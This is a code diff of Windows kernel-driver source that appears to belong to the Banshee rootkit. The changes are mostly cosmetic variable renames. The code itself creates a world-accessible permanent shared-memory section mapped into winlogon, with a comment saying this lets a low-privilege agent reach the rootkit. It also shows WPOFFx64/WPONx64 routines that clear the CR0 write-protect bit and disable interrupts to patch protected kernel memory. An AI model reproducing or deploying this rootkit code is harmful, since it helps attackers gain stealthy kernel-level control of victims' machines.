@@ -18,51 +18,51 @@
 NTSTATUS 
 BeCreateSharedMemory()
 {
-    UNICODE_STRING       SectionName = { 0 };
-    PSECURITY_DESCRIPTOR Sd          = { 0 };
-    OBJECT_ATTRIBUTES    ObjAttr     = { 0 };
-    LARGE_INTEGER        SectionSize = { 0 };
-    KAPC_STATE           Apc         = { 0 };
-    NTSTATUS             Status      = STATUS_UNSUCCESSFUL;
+    UNICODE_STRING       sectionName = { 0 };
+    PSECURITY_DESCRIPTOR sd          = { 0 };
+    OBJECT_ATTRIBUTES    oa          = { 0 };
+    LARGE_INTEGER        sectionSize = { 0 };
+    KAPC_STATE           apc         = { 0 };
+    NTSTATUS             status      = STATUS_UNSUCCESSFUL;
     SIZE_T               ulViewSize  = sizeof(BANSHEE_PAYLOAD);
 
-    RtlInitUnicodeString(&SectionName, L"\\BaseNamedObjects\\Global\\BeShared");
+    RtlInitUnicodeString(&sectionName, L"\\BaseNamedObjects\\Global\\BeShared");
 
     //
     // Add permissions to all users to our shared memory, so that a lowpriv agent can still access the rootkit
     //
-    BeCreateSecurityDescriptor(&Sd);
-    InitializeObjectAttributes(&ObjAttr, &SectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, Sd);
-    SectionSize.LowPart = sizeof(BANSHEE_PAYLOAD);
+    BeCreateSecurityDescriptor(&sd);
+    InitializeObjectAttributes(&oa, &sectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, sd);
+    sectionSize.LowPart = sizeof(BANSHEE_PAYLOAD);
 
-    Status = BeGlobals::pZwCreateSection(&BeGlobals::hSharedMemory, SECTION_ALL_ACCESS, &ObjAttr, &SectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
-    if (!NT_SUCCESS(Status))
+    status = BeGlobals::pZwCreateSection(&BeGlobals::hSharedMemory, SECTION_ALL_ACCESS, &oa, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
+    if (!NT_SUCCESS(status))
     {
-        LOG_MSG("ZwCreateSection fail! Status: 0x%X\n", Status);
-        ExFreePool(Sd);
-        return Status;
+        LOG_MSG("ZwCreateSection fail! Status: 0x%X\n", status);
+        ExFreePool(sd);
+        return status;
     }
 
     //
     // TODO: document
     //
-    KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
+    KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
 
-    Status = BeGlobals::pZwMapViewOfSection(BeGlobals::hSharedMemory, ZwCurrentProcess(), &BeGlobals::pSharedMemory, 0, ulViewSize, NULL, &ulViewSize, ViewUnmap, 0, PAGE_READWRITE);
-    if (!NT_SUCCESS(Status))
+    status = BeGlobals::pZwMapViewOfSection(BeGlobals::hSharedMemory, ZwCurrentProcess(), &BeGlobals::pSharedMemory, 0, ulViewSize, NULL, &ulViewSize, ViewUnmap, 0, PAGE_READWRITE);
+    if (!NT_SUCCESS(status))
     {
-        LOG_MSG("Failed to map shared memory: 0x%X\n", Status);
+        LOG_MSG("Failed to map shared memory: 0x%X\n", status);
         BeGlobals::pZwClose(BeGlobals::hSharedMemory);
-        KeUnstackDetachProcess(&Apc);
-        ExFreePool(Sd);
+        KeUnstackDetachProcess(&apc);
+        ExFreePool(sd);
         return STATUS_UNSUCCESSFUL;
     }
 
     LOG_MSG("Mapped shared memory at 0x%llx\n", (ULONG_PTR)BeGlobals::pSharedMemory);
 
-    KeUnstackDetachProcess(&Apc);
+    KeUnstackDetachProcess(&apc);
 
-    ExFreePool(Sd);
+    ExFreePool(sd);
     return STATUS_SUCCESS;
 }
 
@@ -73,7 +73,9 @@ BeCreateSharedMemory()
  * @param[in] pSharedMemory Pointer to the mapped shared memory.
  */
 VOID 
-BeCloseSharedMemory(_In_ HANDLE HSharedMemory, _In_ PVOID pSharedMemory)
+BeCloseSharedMemory(
+    _In_ HANDLE hSharedMemory, 
+    _In_ PVOID pSharedMemory)
 {
     //
     // TODO: document
@@ -89,8 +91,8 @@ BeCloseSharedMemory(_In_ HANDLE HSharedMemory, _In_ PVOID pSharedMemory)
 
     if (BeGlobals::hSharedMemory != NULL) 
     {
-        BeGlobals::pZwClose(HSharedMemory);
-        HSharedMemory = NULL;
+        BeGlobals::pZwClose(hSharedMemory);
+        hSharedMemory = NULL;
     }
 
     KeUnstackDetachProcess(&apc);
@@ -104,12 +106,12 @@ BeCloseSharedMemory(_In_ HANDLE HSharedMemory, _In_ PVOID pSharedMemory)
 KIRQL 
 WPOFFx64()
 {
-    KIRQL Irql = KeRaiseIrqlToDpcLevel();
-    UINT64 Cr0 = __readcr0();
-    Cr0 &= 0xfffffffffffeffff;
-    __writecr0(Cr0);
+    KIRQL irql = KeRaiseIrqlToDpcLevel();
+    UINT64 cr0 = __readcr0();
+    cr0 &= 0xfffffffffffeffff;
+    __writecr0(cr0);
     _disable();
-    return Irql;
+    return irql;
 }
 
 /*
@@ -118,12 +120,14 @@ WPOFFx64()
  * @param[in] irql Previous interrupt request level to restore.
  */
 VOID 
-WPONx64(_In_ KIRQL irql)
+WPONx64(
+    _In_ KIRQL irql
+)
 {
-    UINT64 Cr0 = __readcr0();
-    Cr0 |= 0x10000;
+    UINT64 cr0 = __readcr0();
+    cr0 |= 0x10000;
     _enable();
-    __writecr0(Cr0);
+    __writecr0(cr0);
     KeLowerIrql(irql);
 }
 
